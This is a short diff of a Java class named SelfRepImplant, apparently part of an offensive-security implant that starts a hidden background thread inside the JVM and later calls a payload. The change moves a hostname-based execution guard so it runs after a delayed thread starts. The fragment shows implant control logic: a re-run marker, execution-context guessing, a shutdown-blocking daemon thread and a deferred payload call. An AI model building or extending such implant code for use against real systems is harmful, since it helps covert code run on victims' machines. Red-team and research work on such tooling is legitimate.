@@ -101,13 +101,8 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
         if (System.setProperty(CONF_JVM_MARKER_PROP, "true") != null) {
             return;
         }
-        int execCtx = guessExecutionContext();
-        String hostname = getHostname();
-        if (!shouldExecute(hostname)) {
-            System.out.println("[!] Will not execute in this environment!");
-            return;
-        }
 
+        int execCtx = guessExecutionContext();
         SelfRepImplant implant = new SelfRepImplant(execCtx);
         Thread background = new Thread(implant);
         background.setDaemon(!CONF_BLOCK_JVM_SHUTDOWN);
@@ -122,6 +117,12 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
                 Thread.sleep(CONF_DELAY_MS);
             } catch (InterruptedException ignored) {
             }
+        }
+
+        String hostname = getHostname();
+        if (!shouldExecute(hostname)) {
+            System.out.println("[!] Will not execute in this environment!");
+            return;
         }
 
         payload();
